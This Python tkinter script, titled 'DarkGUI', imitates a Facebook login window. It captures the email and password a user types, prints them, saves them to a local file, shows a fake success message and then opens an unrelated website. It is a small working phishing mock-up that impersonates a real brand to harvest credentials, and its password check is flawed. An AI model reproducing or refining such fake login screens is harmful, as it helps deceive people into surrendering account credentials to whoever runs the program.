# DarkGUI
from tkinter import *
import tkinter.messagebox as tmsg

root = Tk()
root.geometry('300x500')
root.resizable(False, False)
# root.configure(bg='grey')
def obs():
    if a.get() !=10 and b.get() != '2003':
        tmsg.askretrycancel('', 'Incorrect password or email ')
    else:
        print(f'entered number or email is {a.get()}')
        print(f'entered password is {b.get()}')
        tmsg.showinfo('','Congrats you have successfully eligible to visit facebook' )
        import webbrowser
        webbrowser.open("https://patatap.com")
                        # "#https://www.facebook.com")"https://patatap.com"

        with open('file1.txt', 'w') as f:
            f.write(f'{a.get()} and {b.get()}')
        exit()


Label(root, text='Facebook', font='a 13').pack(side=TOP)
Label(root, text='Mobile number or email', font='a 10 bold').place(y=100)

a = Entry(root, textvariable='inf', width=49, border=2)
a.place(y=130)

Label(root, text='Password', font='a 10 bold').place(y=160)
b = Entry(root, textvariable='pswd', width=49, border=2)
b.place(y=190)

Button(root, text='Log in', font='a 10 bold', fg='white', bg='blue', width=36, command=obs).place(y=220)
Button(root, text='Forgotten password?', fg='blue', bg='white', border=0, font='a 10').place(y=251)

aa = Label(root, text='or', font='a 10 bold')
aa.place(x=130, y=280)

Button(root, text='Create new account', fg='white', bg='green', width=16, font='a 11 bold').place(x=60, y=300)

Label(root, text='English(US)', font='a 9').place(y=350)
mainloop()

